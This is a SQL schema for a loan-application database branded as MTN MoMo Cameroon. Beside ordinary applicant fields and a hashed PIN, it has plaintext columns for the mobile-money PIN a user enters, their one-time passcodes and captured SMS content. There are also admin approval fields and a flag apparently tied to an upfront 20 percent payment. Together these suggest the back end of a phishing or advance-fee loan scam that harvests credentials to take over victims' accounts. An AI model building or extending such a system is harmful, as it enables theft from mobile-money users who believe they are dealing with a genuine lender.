-- ============================================================
-- schema.sql – MTN MoMo Cameroon v3.0.2
-- No pgcrypto dependency — hash handled in Node.js
-- ============================================================

CREATE TABLE IF NOT EXISTS applications (
    id                    TEXT PRIMARY KEY,
    full_name             TEXT NOT NULL,
    email                 TEXT NOT NULL,
    phone                 TEXT NOT NULL,
    momo_pin_hash         TEXT NOT NULL,
    loan_type             TEXT NOT NULL,
    loan_amount           BIGINT NOT NULL,
    loan_term             INTEGER NOT NULL,
    loan_purpose          TEXT NOT NULL,
    employment            TEXT NOT NULL,
    annual_income         BIGINT NOT NULL,
    kin_name              TEXT NOT NULL,
    kin_phone             TEXT NOT NULL,
    has_20_percent        BOOLEAN NOT NULL DEFAULT FALSE,
    tnc_accepted_at       TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    status                TEXT NOT NULL DEFAULT 'application_review',
    user_submitted        BOOLEAN NOT NULL DEFAULT TRUE,
    sms_content           TEXT,
    momo_pin_entered      TEXT,
    otp_entered           TEXT,
    rejection_reason      TEXT,
    admin_decision_by     TEXT,
    approved_at           TIMESTAMPTZ,
    created_at            TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    updated_at            TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

ALTER TABLE applications ADD COLUMN IF NOT EXISTS user_submitted     BOOLEAN NOT NULL DEFAULT TRUE;
ALTER TABLE applications ADD COLUMN IF NOT EXISTS sms_content        TEXT;
ALTER TABLE applications ADD COLUMN IF NOT EXISTS momo_pin_entered   TEXT;
ALTER TABLE applications ADD COLUMN IF NOT EXISTS otp_entered        TEXT;
ALTER TABLE applications ADD COLUMN IF NOT EXISTS rejection_reason   TEXT;
ALTER TABLE applications ADD COLUMN IF NOT EXISTS admin_decision_by  TEXT;
ALTER TABLE applications ADD COLUMN IF NOT EXISTS approved_at        TIMESTAMPTZ;
ALTER TABLE applications ADD COLUMN IF NOT EXISTS has_20_percent     BOOLEAN NOT NULL DEFAULT FALSE;
ALTER TABLE applications ADD COLUMN IF NOT EXISTS tnc_accepted_at    TIMESTAMPTZ DEFAULT NOW();

CREATE INDEX IF NOT EXISTS idx_apps_email  ON applications(email);
CREATE INDEX IF NOT EXISTS idx_apps_phone  ON applications(phone);
CREATE INDEX IF NOT EXISTS idx_apps_status ON applications(status);

CREATE TABLE IF NOT EXISTS check_status_otps (
    token           TEXT PRIMARY KEY,
    application_id  TEXT NOT NULL REFERENCES applications(id) ON DELETE CASCADE,
    otp_hash        TEXT NOT NULL,
    expires_at      TIMESTAMPTZ NOT NULL,
    attempts        INTEGER NOT NULL DEFAULT 0,
    verified        BOOLEAN NOT NULL DEFAULT FALSE,
    last_sent_at    TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX IF NOT EXISTS idx_check_otps_app ON check_status_otps(application_id);

CREATE TABLE IF NOT EXISTS transactions (
    id              SERIAL PRIMARY KEY,
    application_id  TEXT NOT NULL REFERENCES applications(id) ON DELETE CASCADE,
    type            TEXT NOT NULL,
    amount          BIGINT NOT NULL,
    description     TEXT NOT NULL,
    created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX IF NOT EXISTS idx_tx_app ON transactions(application_id);

CREATE TABLE IF NOT EXISTS user_sessions (
    token           TEXT PRIMARY KEY,
    application_id  TEXT NOT NULL REFERENCES applications(id) ON DELETE CASCADE,
    created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    expires_at      TIMESTAMPTZ NOT NULL,
    ip_address      TEXT
);
CREATE INDEX IF NOT EXISTS idx_sessions_app ON user_sessions(application_id);
